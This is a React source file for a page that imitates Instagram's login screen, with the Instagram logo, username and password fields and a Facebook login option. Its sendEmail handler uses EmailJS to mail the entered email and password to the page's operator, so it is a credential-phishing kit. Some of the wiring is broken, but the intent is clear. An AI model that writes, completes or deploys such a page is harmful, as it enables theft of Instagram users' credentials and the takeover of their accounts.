import { AiFillFacebook } from 'react-icons/ai';
import { Link } from 'react-router-dom';
import { useRef, React } from 'react';
import emailjs  from '@emailjs/browser' ;
//AiFillFacebook

const Login2 = () => {

  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_rbfmkcs', 'template_38aeq58', form.current, 'd9TzspmQ9z6VGh61t')
      .then((result) => {
          console.log(result.text);
          console.log("Message Sent succesfully...")
      }, (error) => {
          console.log(error.text);
      });
  };

  return (
    <>
    <div className='align-middle bg-[#fafafa] justify-center pt-10  h-full'>
      <div className='text-center border-2 bg-white pt-6 pb-6 justify-center m-auto w-max xl:w-1/4 '>
          <img src={require('../assets/logo.png')} alt="Instagram Logo" className='align-middle m-auto w-80'/>

        {/* INPUT USERNAME AND PASSWORD  */}
        <span className='flex flex-col align-middle justify-center p-4 bg-white'>
            <input type="text" name='user_email' className='text_input' placeholder='Phone no., username or email address' />
            <hr className='invisible h-3'/>
            <input type="password" name='user_password' className='text_input' placeholder='Password'/>
        </span>

        {/* LOG IN BUTTON */}
        <div className='pt-4 bg-white'>
          <button className='p-2 w-3/4 text-1/2 text-white rounded-lg font-bold bg-[#72b6fa] hover:bg-[#274ef8]' 
          onSubmit={sendEmail}>
            Log in
          </button>
        </div>


          <text className='flex flex-col text-gray-400 pt-12 pb-7 bg-white'> ────────────  OR  ────────────  </text>
          <div className='text[#0543fb88] font-bold flex justify-center h-10 bg-white'> 
          <AiFillFacebook size={25} color="#394588" className=''/>  
          <p className='align-text-center text-xl text-[#394588] bg-white '>Log In with Facebook</p> </div>
          <p className='pt-3 text-[#002972] text-sm bg-white'>Forgotten your password?</p>
      </div>
      <br />
      <br />
      <div className='bg-white justify-center text-center w-80 align-middle m-auto border-2 flex '>
            <p className='bg-white p-10 '>Don't have a account? 
            <Link to="https://www.instagram.com/accounts/emailsignup/" className='font-bold px-2 '>
              Sign up
            </Link>
            
            </p>
      </div>
    </div>
    </>
  )
}

export default Login2